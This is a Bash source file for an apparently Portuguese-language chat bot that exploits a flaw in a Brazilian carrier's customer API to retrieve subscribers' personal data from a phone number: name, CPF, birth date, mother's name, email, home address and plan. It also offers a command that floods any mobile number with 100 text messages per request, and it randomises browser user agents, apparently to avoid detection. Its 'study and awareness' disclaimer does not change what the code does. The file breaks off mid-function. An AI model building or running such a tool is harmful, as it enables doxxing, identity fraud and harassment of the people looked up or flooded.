#!/bin/bash

function help_text()
{

	cat <<- TEXT
	
	Para que seja possível identificar um número de telefone válido, o mesmo deve estar no seguinte formato:
	
	_• Ele deve possuir entre 10 e 11 dígitos, incluindo o DDD_
	_• Ele precisa corresponder com o regex:_ \`[0-9]{10,11}\`
	
	Comportamentos padrões do bot:
	
	_• Letras, caracteres especiais e espaços em branco serão sempre ignorados. Apenas números serão obtidos das mensagens de texto._
	_• Caso o número enviado comece com um 0 (zero), tal digito será removido/ignorado da sequência final de números._
	_• Caso o número enviado comece com_ \`%2b55\` _(código de discagem internacional), tal sequência de caracteres será removida/ignorada da sequência final de números._
	_• Caso o número enviado possua apenas 10 caracteres, o_ [nono dígito](http://anatel.gov.br:80/setorregulado/nono-digito) _será automaticamente incluído na sequência final de números._
	
	TEXT

}

declare -rgf 'help_text'

function flood_help_text()
{

	cat <<- TEXT

	Uso:
	
	\`/flood <número_móvel_e_ddd_aqui>\`
	ou
	\`!flood <número_móvel_e_ddd_aqui>\`
	
	Exemplo:
	
	\`/flood 19999999999\`
	ou
	\`!flood 19999999999\`
	
	Descrição:
	
	Use este comando para solicitar o envio em massa de mensagens de texto para linhas móveis. Funciona com qualquer operadora. Cada requisição enviará 100 mensagens ao número especificado.

	TEXT

}

declare -rgf 'flood_help_text'

function api_unknown_error_text()
{

	cat <<- TEXT
	
	Ocorreu um erro ao tentar processar sua solicitação. Tente novamente dentro de alguns minutos ou refaça a consulta utilizando um outro número de telefone.
	
	TEXT

}

function number_not_found_text()
{

	cat <<- TEXT
	
	O número \`$telephone\` não foi encontrado na base de dados da Vivo. Verifique se ele está no formato correto, se foi digitado corretamente e/ou se ele de fato é uma linha Vivo Móvel.
	
	Para saber quais tipos de formatos de números o bot aceita e quais são seus comportamentos padrões, clique em /help.
	
	TEXT

}

declare -rgf 'number_not_found_text'

function start_text()
{

	cat <<- TEXT
	
	Para consultar informações a respeito do plano e/ou do titular de uma determinada linha Vivo Móvel, me envie o número %2b DDD.
	
	Para saber quais tipos de formatos de números o bot aceita e quais seus comportamentos padrões, clique em /help.
	
	TEXT

}

declare -rgf 'start_text'

function about_text()
{

	cat <<- TEXT
	
	*Como?*
	
	Este bot se aproveita de uma vulnerabilidade da API de consulta e autenticação de dados do Meu Vivo para obter informações pessoais associadas ao titular de linhas Vivo Móvel.
	
	*Porquê?*
	
	Mesmo após ser [processada](http://tecnoblog.net:80/320931/vivo-acao-judicial-expor-dados-pessoais-clientes-meu-vivo) por expor dados pessoais de clientes, a Vivo insiste em continuar utilizando métodos inseguros de login e autenticação em suas plataformas online. Alguns desses métodos possuem diversas vulnerabilidades e podem possibilitar que literalmente qualquer pessoa consulte e veja informações pessoais de outros usuários.
	
	*Propósito*
	
	Este bot tem como objetivo principal alertar usuários e não-usuários da Vivo sobre os métodos e as formas questionáveis de processamento de dados que a empresa utiliza em seus serviços online, tais como o Meu Vivo.
	
	*Direitos legais*
	
	Este bot é destinado a fins de estudo e análise. Este é um software livre e de código aberto. Você é livre para alterar, analisar e redistribuir o código.
	
	O uso desse software é de responsabilidade total do usuário. Use-o por sua conta e risco. 
	
	TEXT

}

declare -rgf 'about_text'

function common_results_text()
{

	cat <<- RESULTS | sed 's/&/%26/g'
		
	*Titular*:
	
	*Nome*: \`$(GetJsonData 'nomeCompleto')\`
	*CPF*: \`$(GetJsonData 'numeroDocumento')\`
	*Tipo*: \`$(jq --raw-output '.pessoa.descricaoTipoPessoa' "$JsonResponse" | ParseOutput)\`
	*Sexo*: \`$(jq --raw-output '.pessoa.descricaoSexo' "$JsonResponse" | ParseOutput)\`
	*Nascimento*: \`$(GetJsonData 'dataNascimento')\`
	*E-mail*: \`$(jq --raw-output '.data.email' "$JsonResponse" | ParseOutput)\`
	*Mãe*: \`$(GetJsonData 'nomeDaMae')\`
	*Alteração:* \`$(jq --raw-output '.pessoa.documentos[][].dataUltimaAlteracao' "$JsonResponse" | ConvertEpoch | ParseOutput)\`
	
	*Endereço*:
	
	*CEP*: \`$(jq --raw-output '.data.cep' "$JsonResponse" | ParseOutput)\`
	*Endereço*: \`$(jq --raw-output '.data.endereco' "$JsonResponse" | ParseOutput)\`
	*Número*: \`$(jq --raw-output '.data.numeroEndereco' "$JsonResponse" | ParseOutput)\`
	*Bairro*: \`$(jq --raw-output '.data.bairro' "$JsonResponse" | ParseOutput)\`
	*Cidade*: \`$(jq --raw-output '.data.cidade' "$JsonResponse" | ParseOutput)\`
	*Estado*: \`$(jq --raw-output '.data.estado' "$JsonResponse" | ParseOutput)\`
	*País*: \`$(jq --raw-output '.pessoa.documentos[][].pais.nome' "$JsonResponse" | ParseOutput)\`
	*Nacionalidade*: \`$( jq --raw-output '.pessoa.documentos[][].pais.nacionalidade' "$JsonResponse" | ParseOutput)\`
	
	*Plano*:
	
	*Linha*: \`$telephone\`
	*Ativação*: \`$(jq --raw-output '.ConsultInformactionLinhaResponseData.creationDate' "$JsonResponse" | ConvertEpoch | ParseOutput)\`
	*Pacote*: \`$(jq --raw-output '.pessoa.nomePlano' "$JsonResponse" | ParseOutput)\`
	*Contratação*: \`$(jq --raw-output '.pessoa.dataAtivacaoAssinatura' "$JsonResponse" | ConvertEpoch | ParseOutput)\`
	*Atualização*: \`$(jq --raw-output '.pessoa.dataAlteracaoStatusAssinatura' "$JsonResponse" | ConvertEpoch | ParseOutput)\`
	*Tipo*: \`$(jq --raw-output '.pessoa.descricaoTipoAssinatura' "$JsonResponse" | ParseOutput)\`
	*Custo*: \`$(jq --raw-output '.currentPlan.price' "$JsonResponse" | ParseOutput)\`
	*Vencimento*: \`$(jq --raw-output '.data.vencimentoFatura' "$JsonResponse" | ParseOutput)\`
	*Status*: \`$(jq --raw-output '.pessoa.descricaoStatusAssinatura' "$JsonResponse" | ParseOutput)\`
	*Conta digital*: \`$(jq --raw-output '.data.contaDigital' "$JsonResponse" | ParseOutput)\`
	
	RESULTS

}

declare -rgf 'common_results_text'

function cnpj_results_text()
{

	cat <<- RESULTS | sed 's/&/%26/g'
	
	*Titular*:
	
	*Nome*: \`$(jq --raw-output '.pessoa.nomeCompleto' "$JsonResponse" | ParseOutput)\`
	*Tipo*: \`$(jq --raw-output '.pessoa.descricaoTipoPessoa' "$JsonResponse" | ParseOutput)\`
	*CNPJ*: \`$(jq --raw-output '.pessoa.documentos[][].numeroDocumento' "$JsonResponse" | ParseOutput)\`
	
	*Plano*:
	
	*Linha*: \`$telephone\`
	*Ativação*: \`$(jq --raw-output '.ConsultInformactionLinhaResponseData.creationDate' "$JsonResponse" | ConvertEpoch | ParseOutput)\`
	*Pacote*: \`$(jq --raw-output '.pessoa.nomePlano' "$JsonResponse" | ParseOutput)\`
	*Contratação*: \`$(jq --raw-output '.pessoa.dataAtivacaoAssinatura' "$JsonResponse" | ConvertEpoch | ParseOutput)\`
	*Atualização*: \`$(jq --raw-output '.pessoa.dataAlteracaoStatusAssinatura' "$JsonResponse" | ConvertEpoch | ParseOutput)\`
	*Tipo*: \`$(jq --raw-output '.pessoa.descricaoTipoAssinatura' "$JsonResponse" | ParseOutput)\`
	*Custo*: \`$(jq --raw-output '.currentPlan.price' "$JsonResponse" | ParseOutput)\`
	*Vencimento*: \`$(jq --raw-output '.data.vencimentoFatura' "$JsonResponse" | ParseOutput)\`
	*Status*: \`$(jq --raw-output '.pessoa.descricaoStatusAssinatura' "$JsonResponse" | ParseOutput)\`
	*Conta digital*: \`$(jq --raw-output '.data.contaDigital' "$JsonResponse" | ParseOutput)\`
	
	RESULTS

}

declare -rgf 'cnpj_results_text'

function flood_running_dialog()
{

	cat <<- TEXT

	_Operação em andamento..._

	*Linha*: \`$telephone\`
	*Operações realizadas:* \[\`$TotalOperations\`/\`100\`]
	*Mensagens enviadas:* \`$SuccessfullyFloods\`
	*Mensagens não enviadas:* \`$UnsuccessfullyFloods\`
	
	TEXT

}

declare -rgf 'flood_running_dialog'

function flood_done_dialog()
{

	cat <<- TEXT

	*Operação concluída.*

	*Linha*: \`$telephone\`
	*Operações realizadas:* \[\`$TotalOperations\`/\`100\`]
	*Mensagens enviadas:* \`$SuccessfullyFloods\`
	*Mensagens não enviadas:* \`$UnsuccessfullyFloods\`
	*Tempo decorrido*: \`$(( "$OperationEndedTimestamp" - "$OperationStartedTimestamp" )) segundos\`
	
	TEXT

}

declare -rgf 'flood_done_dialog'

function ParseOutput()
{

	sed '/null/d' | ( 
								read -r 'OriginalValue'
								if [ -z "$OriginalValue" ]; then
									echo 'NÃO CLASSIFICADO'
								else
									echo "$OriginalValue"
								fi
							 ) | tr '[:lower:]' '[:upper:]'

}

declare -rgf 'ParseOutput'

function ConvertEpoch()
{

	sed -r 's/\s|0{3}$//g' | (
												read -r 'EpochDate'
												date '+%d/%m/%Y' -d "@$EpochDate"
											)

}

declare -rgf 'ConvertEpoch'

function GenerateUserAgent()
{

	# http://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions
	declare -ra WindowsVersions=('1.01' '1.02' '1.03' '1.04' '2.03' '2.10' '2.11' '3.00' '3.10' 'NT 3.1' '3.11' '3.2' 'NT 3.5' 'NT 3.51' '4.00' 'NT 4.0' '4.10' 'NT 5.0' '4.90' 'NT 5.1' 'NT 5.2' 'NT 6.0' 'NT 6.1' 'NT 6.2' 'NT 6.3' 'NT 10.0')
	
	# http://macworld.co.uk/feature/mac/os-x-macos-versions-3662757
	declare -ra macOS_Versions=('10' '10.0' '10.1' '10.2' '10.3' '10.4' '10.4.4' '10.5' '10.6' '10.7' '10.8' '10.9' '10.10' '10.11' '10.12' '10.13' '10.14' '10.15')

	# http://source.android.com/setup/start/build-numbers#source-code-tags-and-builds
	declare -ra AndroidVersions=('1.6' '2.0' '2.1' '2.2' '2.2.1' '2.2.2' '2.2.3' '2.3' '2.3.3' '2.3.3' '2.3.4' '2.3.5' '2.3.6' '2.3.7' '4.0.1' '4.0.2' '4.0.3' '4.0.4' '4.1.1' '4.1.2' '4.2' '4.2.1' '4.2.2' '4.3' '4.3.1' '4.4' '4.4.1' '4.4.2' '4.4.3' '4.4.4' '5.0.0' '5.0.1' '5.0.2' '5.1.0' '5.1.1' '6.0.0' '6.0.1' '7.0.0' '7.1.0' '7.1.1' '7.1.2' '8.0.0' '8.1.0' '9.0.0' '10.0.0')
	
	# http://en.wikipedia.org/wiki/IOS_version_history
	declare -ra iOSVersions=('3.1.3' '4.2.1' '5.1.1' '6.1.6' '7.1.2' '9.3.5' '9.3.6' '10.3.3' '10.3.4' '12.4.4' '13.3')
	
	# System architectures
	declare -ra SystemArchitectures=('32' '64')

	# Number = Browser
	# 0 = Firefox
	# 1 = Chrome
	# 2 = Opera
	# 3 = Vivaldi
	# 4 = Yandex
	
	# Number = Operating System
	# 0 = Windows
	# 1 = macOS
	# 2 = Linux
	# 3 = Android
	# 4 = iOS

	# Generate a random number between 0 and 4 (pick a browser)
	declare -r BrowserSelection=$(tr -dc '0-4' < '/dev/urandom' | head -c '1')

	# Generate a random user agent based on the number contained in the "$BrowserSelection" variable
	if [ "$BrowserSelection" = '0' ]; then
		GenerateFirefox
	elif [ "$BrowserSelection" = '1' ]; then
		GenerateChrome
	elif [ "$BrowserSelection" = '2' ]; then
		GenerateOpera
	elif [ "$BrowserSelection" = '3' ]; then
		GenerateVivaldi
	elif [ "$BrowserSelection" = '4' ]; then
		GenerateYandex
	else
		UserAgent='Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'
	fi

	declare -rg 'UserAgent'

}

declare -rgf 'GenerateUserAgent'

# http://whatismybrowser.com/guides/the-latest-user-agent/chrome
function GenerateChrome()
{

	# Generate a random number between 0 and 4 (pick a operating system)
	declare -r SystemSelection=$(tr -dc '0-4' < '/dev/urandom' | head -c '1')

	# Chrome on Windows
	if [ "$SystemSelection" = '0' ]; then
		UserAgent="Mozilla/5.0 (Windows ${WindowsVersions[$(shuf -i 0-25 --random-source '/dev/urandom' | head -c '2')]}; Win${SystemArchitectures[$(tr -dc 0-1 < '/dev/urandom' | head -c '1')]}; x${SystemArchitectures[$(tr -dc 0-1 < '/dev/urandom' | head -c '1')]}) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Chrome/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2')"
	# Chrome on macOS
	elif [ "$SystemSelection" = '1' ]; then
		UserAgent="Mozilla/5.0 (Macintosh; Intel Mac OS X ${macOS_Versions[$(shuf -i 0-17 --random-source '/dev/urandom' | head -c '2')]}) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Chrome/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2')"
	# Chrome on Linux
	elif [ "$SystemSelection" = '2' ]; then
		UserAgent="Mozilla/5.0 (X11; Linux x86_${SystemArchitectures[$(tr -dc 0-1 < '/dev/urandom' | head -c '1')]}) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Chrome/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2')"
	# Chrome on Android
	elif [ "$SystemSelection" = '3' ]; then
		UserAgent="Mozilla/5.0 (Linux; Android ${AndroidVersions[$(shuf -i 0-44 --random-source '/dev/urandom' | head -c '2')]}) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Chrome/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Mobile Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2')"
	# Chrome on iOS
	elif [ "$SystemSelection" = '4' ]; then
		UserAgent="Mozilla/5.0 (iPhone; CPU iPhone OS ${iOSVersions[$(shuf -i 0-10 --random-source '/dev/urandom' | head -c '2')]} like Mac OS X) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) CriOS/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Mobile/$(tr -dc 'A-Z0-9' < '/dev/urandom' | head -c '7') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2')"
	else
		# If for some reason the "SystemSelection" variable returns an invalid value, set a predefined user agent (Chrome on Linux)
		UserAgent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36'
	fi

}

declare -rgf 'GenerateChrome'

# http://whatismybrowser.com/guides/the-latest-user-agent/firefox
function GenerateFirefox()
{

	# Generate a random number between 0 and 4 (pick a operating system)
	declare -r SystemSelection=$(tr -dc '0-4' < '/dev/urandom' | head -c '1')

	# Firefox on Windows
	if [ "$SystemSelection" = '0' ]; then
		UserAgent="Mozilla/5.0 (Windows ${WindowsVersions[$(shuf -i 0-25 --random-source '/dev/urandom' | head -c '2')]}; WOW${SystemArchitectures[$(tr -dc 0-1 < '/dev/urandom' | head -c '1')]}; rv:$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0) Gecko/$(tr -dc '0-9' < '/dev/urandom' | head -c '8') Firefox/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0"
	# Firefox on macOS
	elif [ "$SystemSelection" = '1' ]; then
		UserAgent="Mozilla/5.0 (Macintosh; Intel Mac OS X ${macOS_Versions[$(shuf -i 0-17 --random-source '/dev/urandom' | head -c '2')]}; rv:$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0) Gecko/$(tr -dc '0-9' < '/dev/urandom' | head -c '8') Firefox/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0"
	# Firefox on Linux
	elif [ "$SystemSelection" = '2' ]; then
		UserAgent="Mozilla/5.0 (X11; Linux i586; rv:$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0) Gecko/$(tr -dc '0-9' < '/dev/urandom' | head -c '8') Firefox/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0"
	# Firefox on Android
	elif [ "$SystemSelection" = '3' ]; then
		UserAgent="Mozilla/5.0 (Android ${AndroidVersions[$(shuf -i 0-44 --random-source '/dev/urandom' | head -c '2')]}; Mobile; rv:$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0) Gecko/$(tr -dc '0-9' < '/dev/urandom' | head -c '8') Firefox/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0"
	# Firefox on iOS
	elif [ "$SystemSelection" = '4' ]; then
		UserAgent="Mozilla/5.0 (iPhone; CPU iPhone OS ${iOSVersions[$(shuf -i 0-10 --random-source '/dev/urandom' | head -c '2')]} like Mac OS X) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '0-9' < '/dev/urandom' | head -c '1').$(tr -dc '0-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) FxiOS/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0 Mobile/$(tr -dc A-Z1-9 < '/dev/urandom' | head -c '5') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '0-9' < '/dev/urandom' | head -c '1').$(tr -dc '0-9' < '/dev/urandom' | head -c '2')"
	else
		# If for some reason the "SystemSelection" variable returns an invalid value, set a predefined user agent (Firefox on Linux)
		UserAgent='Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/71.0'
	fi

}

declare -rgf 'GenerateFirefox'

# http://whatismybrowser.com/guides/the-latest-user-agent/opera
function GenerateOpera()
{

	# Generate a random number between 0 and 3 (pick a operating system)
	declare -r SystemSelection=$(tr -dc '0-3' < '/dev/urandom' | head -c '1')

	# Opera on Windows
	if [ "$SystemSelection" = '0' ]; then
		UserAgent="Mozilla/5.0 (Windows ${WindowsVersions[$(shuf -i 0-25 --random-source '/dev/urandom' | head -c '2')]}; Win${SystemArchitectures[$(tr -dc 0-1 < '/dev/urandom' | head -c '1')]}; x${SystemArchitectures[$(tr -dc 0-1 < '/dev/urandom' | head -c '1')]}) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Chrome/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') OPR/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2')"
	# Opera on macOS
	elif [ "$SystemSelection" = '1' ]; then
		UserAgent="Mozilla/5.0 (Macintosh; Intel Mac OS X ${macOS_Versions[$(shuf -i 0-17 --random-source '/dev/urandom' | head -c '2')]}) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Chrome/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') OPR/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2')"
	# Opera on Linux
	elif [ "$SystemSelection" = '2' ]; then
		UserAgent="Mozilla/5.0 (X11; Linux x86_${SystemArchitectures[$(tr -dc 0-1 < '/dev/urandom' | head -c '1')]}) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Chrome/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') OPR/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2')"
	# Opera on Android
	elif [ "$SystemSelection" = '3' ]; then
		UserAgent="Mozilla/5.0 (Linux; Android ${AndroidVersions[$(shuf -i 0-44 --random-source '/dev/urandom' | head -c '2')]}; AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Chrome/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Mobile Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') OPR/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2')"
	else
		# If for some reason the "SystemSelection" variable returns an invalid value, set a predefined user agent (Opera on Linux)
		UserAgent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 OPR/65.0.3467.72'
	fi

}

declare -rgf 'GenerateOpera'

# http://whatismybrowser.com/guides/the-latest-user-agent/vivaldi
function GenerateVivaldi()
{

	# Generate a random number between 0 and 3 (pick a operating system)
	declare -r SystemSelection=$(tr -dc '0-3' < '/dev/urandom' | head -c '1')

	# Vivaldi on Windows
	if [ "$SystemSelection" = '0' ]; then
		UserAgent="Mozilla/5.0 (Windows ${WindowsVersions[$(shuf -i 0-25 --random-source '/dev/urandom' | head -c '2')]}; WOW${SystemArchitectures[$(tr -dc 0-1 < '/dev/urandom' | head -c '1')]}) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Chrome/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Vivaldi/$(tr -dc '1-9' < '/dev/urandom' | head -c '1').$(tr -dc '0-9' < '/dev/urandom' | head -c '1')"
	# Vivaldi on macOS
	elif [ "$SystemSelection" = '1' ]; then
		UserAgent="Mozilla/5.0 (Macintosh; Intel Mac OS X ${macOS_Versions[$(shuf -i 0-17 --random-source '/dev/urandom' | head -c '2')]}) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Chrome/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Vivaldi/$(tr -dc '1-9' < '/dev/urandom' | head -c '1').$(tr -dc '0-9' < '/dev/urandom' | head -c '1')"
	# Vivaldi on Linux
	elif [ "$SystemSelection" = '2' ]; then
		UserAgent="Mozilla/5.0 (X11; Linux x86_${SystemArchitectures[$(tr -dc 0-1 < '/dev/urandom' | head -c '1')]}) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Chrome/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Vivaldi/$(tr -dc '1-9' < '/dev/urandom' | head -c '1').$(tr -dc '0-9' < '/dev/urandom' | head -c '1')"
	# Vivaldi on Android (This template was manually picked up by me from Vivaldi Beta for Android)
	elif [ "$SystemSelection" = '3' ]; then
		UserAgent="Mozilla/5.0 (Linux; Android ${AndroidVersions[$(shuf -i 0-44 --random-source '/dev/urandom' | head -c '2')]}) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Chrome/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Mobile Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') Vivaldi/$(tr -dc '1-9' < '/dev/urandom' | head -c '1').$(tr -dc '0-9' < '/dev/urandom' | head -c '1').$(tr -dc '0-9' < '/dev/urandom' | head -c '4').$(tr -dc '0-9' < '/dev/urandom' | head -c '2')"
	else
		# If for some reason the "SystemSelection" variable returns an invalid value, set a predefined user agent (Vivaldi on Linux)
		UserAgent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Vivaldi/2.9'
	fi

}

declare -rgf 'GenerateVivaldi'

# http://whatismybrowser.com/guides/the-latest-user-agent/yandex
function GenerateYandex()
{

	# Generate a random number between 0 to 1 and between 3 to 4 (pick a operating system)
	declare -r SystemSelection=$(tr -dc '0-13-4' < '/dev/urandom' | head -c '1')

	# Yandex on Windows
	if [ "$SystemSelection" = '0' ]; then
		UserAgent="Mozilla/5.0 (Windows ${WindowsVersions[$(shuf -i 0-25 --random-source '/dev/urandom' | head -c '2')]}) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Chrome/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') YaBrowser/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').$(tr -dc '0-9' < '/dev/urandom' | head -c '1').$(tr -dc '0-9' < '/dev/urandom' | head -c '1').$(tr -dc '0-9' < '/dev/urandom' | head -c '3') Yowser/$(tr -dc '1-9' < '/dev/urandom' | head -c '1').$(tr -dc '0-9' < '/dev/urandom' | head -c '1') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2')"
	# Yandex on macOS
	elif [ "$SystemSelection" = '1' ]; then
		UserAgent="Mozilla/5.0 (Macintosh; Intel Mac OS X ${macOS_Versions[$(shuf -i 0-17 --random-source '/dev/urandom' | head -c '2')]}) AppleWebKit/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') (KHTML, like Gecko) Chrome/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').0.$(tr -dc '1-9' < '/dev/urandom' | head -c '4').$(tr -dc '1-9' < '/dev/urandom' | head -c '2') YaBrowser/$(tr -dc '1-9' < '/dev/urandom' | head -c '2').$(tr -dc '0-9' < '/dev/urandom' | head -c '1').$(tr -dc '0-9' < '/dev/urandom' | head -c '1').$(tr -dc '1-9' < '/dev/urandom' | head -c '4') Yowser/$(tr -dc '1-9' < '/dev/urandom' | head -c '1').$(tr -dc '0-9' < '/dev/urandom' | head -c '1') Safari/$(tr -dc '1-9' < '/dev/urandom' | head -c '3').$(tr -dc '1-9' < '/dev/urandom' | head -c '2')"
	# Yandex on Android
	elif [ "$SystemSelection" = '3' ]; then
